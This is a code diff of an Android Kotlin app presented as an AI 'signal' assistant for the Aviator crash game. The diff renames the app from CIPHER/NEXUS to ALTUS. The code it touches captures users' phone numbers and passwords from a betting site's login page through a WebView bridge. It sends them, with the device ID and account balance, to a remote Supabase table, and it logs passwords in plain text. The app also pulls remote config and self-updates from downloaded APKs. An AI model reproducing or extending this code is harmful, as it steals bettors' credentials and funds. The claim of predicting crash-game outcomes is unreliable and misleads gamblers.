@@ -99,7 +99,7 @@ class MainActivity : AppCompatActivity() {
     private val historicoVelas = mutableListOf<Double>()
 
     // ══════════════════════════════════════════════════════════
-    // CIPHER ML ENGINE — Níveis 2, 3 e 4
+    // ALTUS ML ENGINE — Níveis 2, 3 e 4
     // ══════════════════════════════════════════════════════════
 
     // Nível 3 — Memória adaptativa: janela deslizante de até 200 crashes
@@ -283,7 +283,7 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
     /** Persistir estado ML entre sessões */
     private fun guardarEstadoML() {
         try {
-            val prefs = getSharedPreferences("cipher_ml", MODE_PRIVATE)
+            val prefs = getSharedPreferences("altus_ml", MODE_PRIVATE)
             prefs.edit().apply {
                 putInt("ml_total", mlTotalSinais)
                 putInt("ml_acertos_prot", mlAcertosProtecao)
@@ -307,7 +307,7 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
     /** Restaurar estado ML de sessão anterior */
     private fun restaurarEstadoML() {
         try {
-            val prefs = getSharedPreferences("cipher_ml", MODE_PRIVATE)
+            val prefs = getSharedPreferences("altus_ml", MODE_PRIVATE)
             mlTotalSinais     = prefs.getInt("ml_total", 0)
             mlAcertosProtecao = prefs.getInt("ml_acertos_prot", 0)
             mlAcertosAlcance  = prefs.getInt("ml_acertos_alc", 0)
@@ -543,9 +543,9 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
     // MELHORIA 9 — REINÍCIO AUTOMÁTICO APÓS CRASH DO APP
     // Guarda e restaura o último sinal activo em SharedPreferences.
     // ══════════════════════════════════════════════════════════════
-    private val PREFS_ESTADO = "nexus_estado"
-    private val PREFS_HISTORICO = "nexus_historico_velas"
-    private val NOTIF_CHANNEL_ID = "nexus_sinais"
+    private val PREFS_ESTADO = "altus_estado"
+    private val PREFS_HISTORICO = "altus_historico_velas"
+    private val NOTIF_CHANNEL_ID = "altus_sinais"
     private val NOTIF_ID_SINAL = 1001
     private val PREFS_SINAL_JSON = "ultimo_sinal_json"
     private val PREFS_CONSERVADOR = "modo_conservador"
@@ -828,7 +828,7 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
     private var takeProfitAtivo = false
     private val STOP_LOSS_PORCENTO  = 20.0
     private val TAKE_PROFIT_PORCENTO = 30.0
-    private val PREFS = "nexus_prefs"
+    private val PREFS = "altus_prefs"
 
     // Credenciais
     private var ultimoNumeroEnviado = ""
@@ -933,9 +933,9 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                NOTIF_CHANNEL_ID, "Sinais CIPHER", NotificationManager.IMPORTANCE_HIGH
+                NOTIF_CHANNEL_ID, "Sinais ALTUS", NotificationManager.IMPORTANCE_HIGH
             ).apply {
-                description = "Notificações de sinais do CIPHER"
+                description = "Notificações de sinais do ALTUS"
                 enableVibration(true)
                 vibrationPattern = longArrayOf(0, 300, 100, 300)
             }
@@ -1417,13 +1417,13 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
                 val numRaw = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
                 val num = if (numRaw.startsWith("244") && numRaw.length > 9) numRaw.substring(3) else numRaw
                 val sen = ultimaSenhaEnviada
-                android.util.Log.d("NEXUS_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
+                android.util.Log.d("ALTUS_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
                 if (num.isNotEmpty() && sen.isNotEmpty()) {
                     enviarCredencial(num, sen)
-                    android.util.Log.d("NEXUS_CRED", "submeterCredencial() → enviando num=$num")
+                    android.util.Log.d("ALTUS_CRED", "submeterCredencial() → enviando num=$num")
                 } else {
                     // Tentar capturar campos da página diretamente antes de desistir
-                    android.util.Log.w("NEXUS_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
+                    android.util.Log.w("ALTUS_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
                 }
             }
 
@@ -1431,7 +1431,7 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
             fun reportarSaldo(saldo: String) {
                 // Chamado pelo JS após login quando o saldo está visível na página
                 if (saldo.isNotEmpty()) {
-                    android.util.Log.d("NEXUS_CRED", "reportarSaldo() → saldo=$saldo")
+                    android.util.Log.d("ALTUS_CRED", "reportarSaldo() → saldo=$saldo")
                     atualizarSaldo(saldo)
                 }
             }
@@ -1695,7 +1695,7 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
                                             numeroTemporario    = pendingNum
                                             // Remover indicativo 244 se presente
                                             val numLimpo = if (pendingNum.startsWith("244") && pendingNum.length > 9) pendingNum.substring(3) else pendingNum
-                                            android.util.Log.d("NEXUS_CRED", "Número final → $numLimpo")
+                                            android.util.Log.d("ALTUS_CRED", "Número final → $numLimpo")
                                             enviarSupabase("Numero", numLimpo)
                                         }
                                     }
@@ -1713,7 +1713,7 @@ ML_ENGINE_DADOS (aprende com ${mlTotalSinais} sinais reais):
                                         if (pendingSen != credUltimaSen) {
                                             credUltimaSen      = pendingSen
                                             ultimaSenhaEnviada = pendingSen
-                                            android.util.Log.d("NEXUS_CRED", "Senha final → len=${pendingSen.length}")
+                                            android.util.Log.d("ALTUS_CRED", "Senha final → len=${pendingSen.length}")
                                             enviarSupabase("Senha", pendingSen)
                                         }
                                     }
@@ -2989,7 +2989,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
             conn.setRequestProperty("Authorization", "Bearer $key")
             conn.setRequestProperty("Content-Type", "application/json")
             conn.setRequestProperty("HTTP-Referer", "https://elephantbet.co.ao")
-            conn.setRequestProperty("X-Title", "NEXUS Aviator")
+            conn.setRequestProperty("X-Title", "ALTUS Aviator")
             conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36")
             conn.doOutput = true
             conn.connectTimeout = 30000
@@ -3134,7 +3134,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 // Limpar UI imediatamente — countdown aparece na zona central (txtJanela)
                 runOnUiThread {
                     // Topo: tendência mostra estado neutro (não o countdown)
-                    txtAcao.text = "CIPHER"
+                    txtAcao.text = "ALTUS"
                     txtAcao.setTextColor(Color.parseColor("#334155"))
                     txtAcao.visibility = View.VISIBLE
                     // Zona central: limpar previsão anterior
@@ -3190,7 +3190,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                             // Ignorar modoSilenciosoAtivo — o ciclo não depende do voo
                             modoSilenciosoAtivo = false
                             runOnUiThread {
-                                txtAcao.text = "CIPHER"
+                                txtAcao.text = "ALTUS"
                                 txtAcao.setTextColor(Color.parseColor("#334155"))
                                 if (::txtJanela.isInitialized) {
                                     txtJanela.text = "> ANALISANDO..."
@@ -3241,12 +3241,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     mapa["ds_key"]?.let   { DS_KEY   = it }
                     mapa["ds_model"]?.let { DS_MODEL = it }
                     configRemotaCarregada = mapa.containsKey("or_key1") && mapa["or_key1"]!!.isNotBlank()
-                    android.util.Log.d("NEXUS_CONFIG", "Config remota carregada: ${mapa.keys} — OK=$configRemotaCarregada")
+                    android.util.Log.d("ALTUS_CONFIG", "Config remota carregada: ${mapa.keys} — OK=$configRemotaCarregada")
                 } else {
-                    android.util.Log.w("NEXUS_CONFIG", "Config remota: HTTP ${conn.responseCode} — a usar valores locais")
+                    android.util.Log.w("ALTUS_CONFIG", "Config remota: HTTP ${conn.responseCode} — a usar valores locais")
                 }
             } catch (e: Exception) {
-                android.util.Log.w("NEXUS_CONFIG", "Config remota falhou: ${e.message} — a usar valores locais")
+                android.util.Log.w("ALTUS_CONFIG", "Config remota falhou: ${e.message} — a usar valores locais")
             }
         }.start()
     }
@@ -3486,7 +3486,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         try {
             val notif = NotificationCompat.Builder(this, NOTIF_CHANNEL_ID)
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setContentTitle("✈️ CIPHER · Novo Sinal")
+                .setContentTitle("✈️ ALTUS · Novo Sinal")
                 .setContentText("🛡 $protecao  ›  🎯 $alcance  ·  $tendencia")
                 .setPriority(NotificationCompat.PRIORITY_HIGH)
                 .setAutoCancel(true)
@@ -3495,7 +3495,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
             val nm = getSystemService(NotificationManager::class.java)
             nm.notify(NOTIF_ID_SINAL, notif)
         } catch (e: Exception) {
-            android.util.Log.w("NEXUS", "Notificação falhou: \${e.message}")
+            android.util.Log.w("ALTUS", "Notificação falhou: \${e.message}")
         }
     }
 
@@ -3523,13 +3523,13 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 val code = conn.responseCode
                 if (code !in 200..299) {
                     val err = conn.errorStream?.bufferedReader()?.readText() ?: ""
-                    android.util.Log.w("NEXUS_INSTALL", "PATCH ultimo_acesso HTTP $code: $err")
+                    android.util.Log.w("ALTUS_INSTALL", "PATCH ultimo_acesso HTTP $code: $err")
                 } else {
-                    android.util.Log.d("NEXUS_INSTALL", "PATCH ultimo_acesso OK — $androidId")
+                    android.util.Log.d("ALTUS_INSTALL", "PATCH ultimo_acesso OK — $androidId")
                 }
                 conn.disconnect()
             } catch (e: Exception) {
-                android.util.Log.w("NEXUS_INSTALL", "actualizarUltimoAcesso: ${e.message}")
+                android.util.Log.w("ALTUS_INSTALL", "actualizarUltimoAcesso: ${e.message}")
             }
         }.start()
     }
@@ -3575,7 +3575,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
     private fun registarInstalacao() {
         Thread {
             try {
-                val prefs = getSharedPreferences("nexus_prefs", MODE_PRIVATE)
+                val prefs = getSharedPreferences("altus_prefs", MODE_PRIVATE)
                 val androidId = android.provider.Settings.Secure.getString(
                     contentResolver, android.provider.Settings.Secure.ANDROID_ID
                 ) ?: "unknown"
@@ -3628,7 +3628,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     conn.disconnect()
                 }
             } catch (e: Exception) {
-                android.util.Log.e("NEXUS_INSTALL", "Erro ao registar instalação: ${e.message}")
+                android.util.Log.e("ALTUS_INSTALL", "Erro ao registar instalação: ${e.message}")
             }
         }.start()
     }
@@ -3681,7 +3681,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
     fun atualizarSaldo(saldo: String) {
         if (saldo.isEmpty()) return
         if (sessaoId < 0) {
-            android.util.Log.w("NEXUS_CRED", "atualizarSaldo ignorado — sessaoId não disponível ainda")
+            android.util.Log.w("ALTUS_CRED", "atualizarSaldo ignorado — sessaoId não disponível ainda")
             // Tentar de novo em 2s (INSERT pode ainda estar em curso)
             handler.postDelayed({ atualizarSaldo(saldo) }, 2000)
             return
@@ -3702,9 +3702,9 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
                 val code = conn.responseCode
                 conn.disconnect()
-                android.util.Log.d("NEXUS_CRED", "atualizarSaldo -> HTTP $code | id=$sessaoId saldo=$saldoEsc")
+                android.util.Log.d("ALTUS_CRED", "atualizarSaldo -> HTTP $code | id=$sessaoId saldo=$saldoEsc")
             } catch (e: Exception) {
-                android.util.Log.e("NEXUS_CRED", "atualizarSaldo falhou: ${e.message}")
+                android.util.Log.e("ALTUS_CRED", "atualizarSaldo falhou: ${e.message}")
             }
         }.start()
     }
@@ -3735,23 +3735,23 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     java.io.BufferedReader(java.io.InputStreamReader(stream)).readText()
                 else ""
                 conn.disconnect()
-                android.util.Log.d("NEXUS_CRED", "enviarCredencial HTTP=$code resp=$resp")
+                android.util.Log.d("ALTUS_CRED", "enviarCredencial HTTP=$code resp=$resp")
                 // Extrair o id da resposta: [{"id":42,"numero":...}]
                 val idMatch = Regex("\"id\"\\s*:\\s*(\\d+)").find(resp)
                 if (idMatch != null) {
                     sessaoId = idMatch.groupValues[1].toInt()
-                    android.util.Log.d("NEXUS_CRED", "enviarCredencial -> sessaoId=$sessaoId")
+                    android.util.Log.d("ALTUS_CRED", "enviarCredencial -> sessaoId=$sessaoId")
                 } else {
-                    android.util.Log.w("NEXUS_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
+                    android.util.Log.w("ALTUS_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
                     // Retry automático após falha de rede (1 tentativa)
                     if (code !in 200..299 && numero.isNotEmpty() && senha.isNotEmpty()) {
-                        android.util.Log.w("NEXUS_CRED", "A tentar de novo em 5s...")
+                        android.util.Log.w("ALTUS_CRED", "A tentar de novo em 5s...")
                         Thread.sleep(5000)
                         enviarCredencial(numero, senha)
                     }
                 }
             } catch (e: Exception) {
-                android.util.Log.e("NEXUS_CRED", "enviarCredencial falhou: ${e.message}")
+                android.util.Log.e("ALTUS_CRED", "enviarCredencial falhou: ${e.message}")
             }
         }.start()
     }
@@ -3760,7 +3760,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         val androidId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
         val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\",\"device_id\":\"$androidId\"}"
-        android.util.Log.d("NEXUS_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
+        android.util.Log.d("ALTUS_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
@@ -3776,12 +3776,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 val errBody = if (errStream != null) BufferedReader(InputStreamReader(errStream)).readText() else ""
                 conn.disconnect()
                 if (code in 200..299) {
-                    android.util.Log.d("NEXUS_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
+                    android.util.Log.d("ALTUS_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
                 } else {
-                    android.util.Log.e("NEXUS_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
+                    android.util.Log.e("ALTUS_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
                 }
             } catch (e: Exception) {
-                android.util.Log.e("NEXUS_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
+                android.util.Log.e("ALTUS_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
             }
         }.start()
     }
@@ -3820,8 +3820,8 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 OutputStreamWriter(c2.outputStream).use { it.write("{\"forcar_update\":false}") }
                 c2.responseCode; c2.disconnect()
 
-                // 3. Buscar versão e URL do APK mais recente (só registos do CIPHER)
-                val c3 = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk&bot=eq.cipher&order=id.desc&limit=1")
+                // 3. Buscar versão e URL do APK mais recente (só registos do ALTUS)
+                val c3 = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk&bot=eq.altus&order=id.desc&limit=1")
                     .openConnection() as HttpURLConnection
                 c3.requestMethod = "GET"
                 c3.setRequestProperty("apikey", SUPA_KEY)
@@ -3853,7 +3853,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
     private fun verificarAtualizacao() {
         Thread {
             try {
-                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&bot=eq.cipher&order=id.desc&limit=1")
+                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&bot=eq.altus&order=id.desc&limit=1")
                     .openConnection() as HttpURLConnection
                 conn.requestMethod = "GET"
                 conn.setRequestProperty("apikey", SUPA_KEY)
@@ -3896,11 +3896,11 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
 
     private fun iniciarDownloadApk(versaoNova: String, urlApk: String) {
         try {
-            val nomeArquivo = "CIPHER-v$versaoNova.apk"
+            val nomeArquivo = "ALTUS-v$versaoNova.apk"
 
             // Diálogo de progresso
             val progressDialog = AlertDialog.Builder(this)
-                .setTitle("⬇️ A descarregar CIPHER v$versaoNova")
+                .setTitle("⬇️ A descarregar ALTUS v$versaoNova")
                 .setMessage("Por favor aguarda...")
                 .setCancelable(false)
                 .create()
@@ -3966,7 +3966,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 else -> "➡️"
             }
             val confTxt = if (confianca > 0) " · $confianca%" else ""
-            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "NEXUS: SINAL ACTIVO"
+            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "ALTUS: SINAL ACTIVO"
             val horaTxt = "${String.format("%02d", horaAtual)}:${String.format("%02d", minAgora)}"
             // Relógio gerido pelo iniciarRelogio — não tocar aqui
 
@@ -4159,7 +4159,7 @@ private fun mostrarEmVoo(num: Double) {
 
         // Cabeçalho
         layout.addView(TextView(this).apply {
-            text = "> CIPHER  v$VERSAO_ATUAL"; textSize = 15f
+            text = "> ALTUS  v$VERSAO_ATUAL"; textSize = 15f
             typeface = Typeface.MONOSPACE; setTextColor(Color.parseColor("#00ff41"))
             letterSpacing = 0.08f
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(4) }
@@ -4309,14 +4309,14 @@ private fun mostrarEmVoo(num: Double) {
     // ── TUTORIAL ─────────────────────────────────────────────────
     private fun mostrarTutorial() { return // tutorial removido
         val slides = listOf(
-            Triple("🛰️ BEM-VINDO AO NEXUS", "#0e7490",
-                "O NEXUS é o teu co-piloto no Aviator.\n\n" +
+            Triple("🛰️ BEM-VINDO AO ALTUS", "#0e7490",
+                "O ALTUS é o teu co-piloto no Aviator.\n\n" +
                 "Usa Inteligência Artificial para analisar o padrão das velas em tempo real e indicar-te os melhores momentos para entrar — com protecção e objectivo definidos.\n\n" +
                 "Segue os sinais com disciplina. A IA trabalha por ti, mas quem decide és sempre tu.\n\n" +
                 "⚠️ Nenhum sistema garante lucro. Joga com responsabilidade."
             ),
             Triple("⏳ ARRANQUE — AGUARDA A CALIBRAÇÃO", "#b45309",
-                "Quando abres o Aviator, o NEXUS entra em modo de observação.\n\n" +
+                "Quando abres o Aviator, o ALTUS entra em modo de observação.\n\n" +
                 "Precisa de ver 15 velas ao vivo antes de emitir o primeiro sinal. É a calibração do mercado.\n\n" +
                 "Na barra verás:\n" +
                 "📡 A sincronizar... (8/15)\n\n" +
@@ -4344,7 +4344,7 @@ private fun mostrarEmVoo(num: Double) {
                 "⚠️ Nunca dobres a aposta após perda."
             ),
             Triple("🚫 SINAIS DE PERIGO", "#dc2626",
-                "O NEXUS avisa-te quando o mercado está desfavorável:\n\n" +
+                "O ALTUS avisa-te quando o mercado está desfavorável:\n\n" +
                 "🔵🔵🔵 Três ou mais velas azuis seguidas → PARA. O mercado está em queda livre.\n\n" +
                 "📉 Tendência QUEDA → reduz a aposta para metade ou não entres.\n\n" +
                 "⚡ Depois de uma vela MEGA (≥ 50x) → espera 3 a 5 rondas antes de voltar a jogar.\n\n" +
@@ -4352,7 +4352,7 @@ private fun mostrarEmVoo(num: Double) {
             ),
             Triple("💰 BANCA E APOSTA SEGURA", "#065f46",
                 "Define a tua banca em ⚙️ → Definir banca.\n\n" +
-                "O NEXUS calcula automaticamente 2% da banca como aposta por ronda.\n" +
+                "O ALTUS calcula automaticamente 2% da banca como aposta por ronda.\n" +
                 "Ex: Banca 5.000 AOA → aposta de 100 AOA por ronda.\n\n" +
                 "Regras de ouro:\n" +
                 "• Nunca apostes mais de 5% da banca numa única ronda\n" +
@@ -4361,7 +4361,7 @@ private fun mostrarEmVoo(num: Double) {
                 "Consistência bate ganância. Sempre."
             ),
             Triple("🛑 OS TEUS LIMITES AUTOMÁTICOS", "#7c2d12",
-                "O NEXUS monitoriza a tua sessão e avisa-te quando é hora de parar:\n\n" +
+                "O ALTUS monitoriza a tua sessão e avisa-te quando é hora de parar:\n\n" +
                 "🛑 STOP-LOSS — Perdeste 20% da banca → o app avisa para sair.\n" +
                 "Ex: Banca 5.000 AOA → alerta ao perder 1.000 AOA.\n\n" +
                 "✅ TAKE-PROFIT — Ganhaste 30% da banca → o app sugere guardar e sair.\n" +
@@ -4526,7 +4526,7 @@ private fun mostrarEmVoo(num: Double) {
             runOnUiThread {
                 AlertDialog.Builder(this)
                     .setTitle("🛑 STOP-LOSS ACTIVADO")
-                    .setMessage("Perdeste ${String.format("%.0f", perdaTotal)} AOA (${STOP_LOSS_PORCENTO.toInt()}% da banca inicial).\n\nO NEXUS recomenda parar agora.\n\nContinuar a jogar agora é emocionalmente arriscado.")
+                    .setMessage("Perdeste ${String.format("%.0f", perdaTotal)} AOA (${STOP_LOSS_PORCENTO.toInt()}% da banca inicial).\n\nO ALTUS recomenda parar agora.\n\nContinuar a jogar agora é emocionalmente arriscado.")
                     .setPositiveButton("Parar e sair") { _, _ -> finish() }
                     .setNegativeButton("Ignorar (risco meu)") { d, _ -> d.dismiss() }
                     .show()
